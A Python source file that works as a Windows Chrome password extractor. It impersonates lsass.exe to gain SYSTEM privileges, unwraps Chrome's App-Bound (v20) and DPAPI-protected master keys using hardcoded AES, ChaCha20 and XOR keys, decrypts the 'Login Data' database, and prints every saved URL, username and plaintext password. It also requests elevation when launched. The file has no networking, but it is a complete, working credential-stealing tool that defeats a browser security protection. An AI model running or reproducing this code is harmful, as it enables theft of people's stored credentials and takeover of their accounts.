import os
import io
import shutil
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
from contextlib import contextmanager
import tempfile
import sys
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional
from argparse import ArgumentParser

import windows
import windows.crypto
import windows.generated_def as gdef

from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get SYSTEM privilege"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token


def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)

    parsed_data['flag'] = buffer.read(1)[0]

    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] in (3, 4):
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data


def decrypt_with_cng(input_data, key_name):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None, None, 0,
        ctypes.byref(pcbResult), 0x40
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey, input_buffer, len(input_buffer), None, output_buffer,
        buffer_size, ctypes.byref(pcbResult), 0x40
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])


def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(aes_key)
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(chacha20_key)
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name="Google Chromekey1")
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)
    elif parsed_data['flag'] == 4:
        xor_key = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name="Google Chromekey2")
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)


# ---------------------------------------------------------------------------
# Reusable key-derivation + blob decryption (used by passwords AND cookies)
# ---------------------------------------------------------------------------

def derive_chromium_ciphers(local_state_path: str,
                            log_callback: Optional[Callable[[str], None]] = None):
    """
    Returns (v20_cipher, v10_cipher) derived from a Local State file.
    Either may be None if the key is unavailable / not admin.
    """
    v20_cipher = None
    v10_cipher = None

    if not local_state_path or not os.path.isfile(local_state_path):
        return v20_cipher, v10_cipher

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
    except Exception as e:
        if log_callback:
            log_callback(f"Failed to read Local State: {e}")
        return v20_cipher, v10_cipher

    os_crypt = local_state.get("os_crypt", {})
    app_bound_encrypted_key = os_crypt.get("app_bound_encrypted_key")
    encrypted_key = os_crypt.get("encrypted_key")

    if app_bound_encrypted_key:
        if not is_admin():
            if log_callback:
                log_callback("Admin privileges required for App-Bound (v20) decryption.")
        else:
            try:
                raw_appb = binascii.a2b_base64(app_bound_encrypted_key)
                if raw_appb[:4] == b"APPB":
                    key_blob_encrypted = raw_appb[4:]
                    with impersonate_lsass():
                        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
                    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
                    parsed_data = parse_key_blob(key_blob_user_decrypted)
                    v20_master_key = derive_v20_master_key(parsed_data)
                    v20_cipher = AESGCM(v20_master_key)
            except Exception as e:
                if log_callback:
                    log_callback(f"Failed to derive v20 master key: {e}")

    if encrypted_key:
        try:
            raw_key = binascii.a2b_base64(encrypted_key)
            if raw_key[:5] == b"DPAPI":
                v10_master_key = windows.crypto.dpapi.unprotect(raw_key[5:])
                v10_cipher = AESGCM(v10_master_key)
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to derive v10 master key: {e}")

    return v20_cipher, v10_cipher


def decrypt_chromium_blob(encrypted_value: Any,
                          v20_cipher,
                          v10_cipher,
                          skip_header: int = 0,
                          log_callback: Optional[Callable[[str], None]] = None) -> str:
    """
    Decrypt a v20 / v10 / legacy DPAPI blob.
    `skip_header` = bytes to drop after decryption (32 for cookies, 0 for passwords).
    """
    if not encrypted_value:
        return ""
    if isinstance(encrypted_value, (memoryview, bytearray)):
        encrypted_value = bytes(encrypted_value)
    elif isinstance(encrypted_value, str):
        return encrypted_value

    try:
        if encrypted_value.startswith(b"v20"):
            if not v20_cipher:
                return "(v20 key unavailable)"
            nonce = encrypted_value[3:15]
            ct = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            pt = v20_cipher.decrypt(nonce, ct + tag, None)
            return pt[skip_header:].decode("utf-8", errors="replace") if len(pt) > skip_header else pt.decode("utf-8", errors="replace")
        elif encrypted_value.startswith(b"v10"):
            if not v10_cipher:
                return "(v10 key unavailable)"
            nonce = encrypted_value[3:15]
            ct = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            pt = v10_cipher.decrypt(nonce, ct + tag, None)
            return pt[skip_header:].decode("utf-8", errors="replace") if len(pt) > skip_header else pt.decode("utf-8", errors="replace")
        else:
            pt = windows.crypto.dpapi.unprotect(encrypted_value)
            return pt.decode("utf-8", errors="replace")
    except Exception as e:
        if log_callback:
            log_callback(f"Value decryption failed: {e}")
        return "(decryption failed)"


# ---------------------------------------------------------------------------
# Password extraction
# ---------------------------------------------------------------------------

def extract_chrome_passwords(profile_dir_path: str,
                             local_state_path: Optional[str] = None,
                             log_callback: Optional[Callable[[str], None]] = None) -> List[Dict[str, str]]:
    profile_dir = Path(profile_dir_path)
    login_db_path = profile_dir / "Login Data"

    if not login_db_path.is_file():
        if log_callback:
            log_callback(f"Login Data not found in {profile_dir} — no saved passwords.")
        return []

    if not local_state_path or not os.path.isfile(local_state_path):
        candidate = profile_dir.parent / "Local State"
        if candidate.is_file():
            local_state_path = str(candidate)
        else:
            candidate = profile_dir / "Local State"
            if candidate.is_file():
                local_state_path = str(candidate)

    if not local_state_path or not os.path.isfile(local_state_path):
        if log_callback:
            log_callback(f"Local State not found for {profile_dir} — cannot decrypt passwords.")
        return []

    v20_cipher, v10_cipher = derive_chromium_ciphers(local_state_path, log_callback)

    results: List[Dict[str, str]] = []

    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db_path = os.path.join(temp_dir, "TempLoginData")
        try:
            shutil.copy2(str(login_db_path), temp_db_path)
            wal_source = login_db_path.with_name(login_db_path.name + "-wal")
            if wal_source.is_file():
                try:
                    shutil.copy2(str(wal_source), os.path.join(temp_dir, "TempLoginData-wal"))
                except Exception:
                    pass
        except PermissionError as e:
            if getattr(e, "winerror", None) == 32:
                if log_callback:
                    log_callback("Browser is running and locking Login Data. Close it and try again.")
            else:
                if log_callback:
                    log_callback(f"Permission error accessing Login Data: {e}")
            return []
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to copy Login Data: {e}")
            return []

        try:
            db_uri = f"file:{pathlib.Path(temp_db_path).as_posix()}?mode=ro"
            con = sqlite3.connect(db_uri, uri=True)
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins")
            logins = cur.fetchall()
            con.close()
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to query Login Data database: {e}")
            return []

        for url, username, encrypted_pwd in logins:
            if not encrypted_pwd:
                continue
            url = url or ""
            username = username or ""
            password = decrypt_chromium_blob(encrypted_pwd, v20_cipher, v10_cipher,
                                             skip_header=0, log_callback=log_callback)
            results.append({"hostname": url, "username": username, "password": password})

    return results


def main():
    parser = ArgumentParser(description="Extract and decrypt saved passwords")
    parser.add_argument("-d", "--dir", dest="directory", help="Path to profile directory")
    args = parser.parse_args()

    if args.directory:
        profile_dir = Path(args.directory)
    else:
        user_profile = os.environ.get("USERPROFILE", "")
        profile_dir = Path(user_profile) / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default"

    print(f"Extracting passwords from: {profile_dir}")
    passwords = extract_chrome_passwords(str(profile_dir), log_callback=print)
    print(f"\nExtracted {len(passwords)} password(s):")
    for p in passwords:
        print(f"URL: {p['hostname']}")
        print(f"Username: {p['username']}")
        print(f"Password: {p['password']}\n")


if __name__ == "__main__":
    if not is_admin():
        import subprocess
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, subprocess.list2cmdline(sys.argv), None, 1
        )
        sys.exit()
    else:
        main()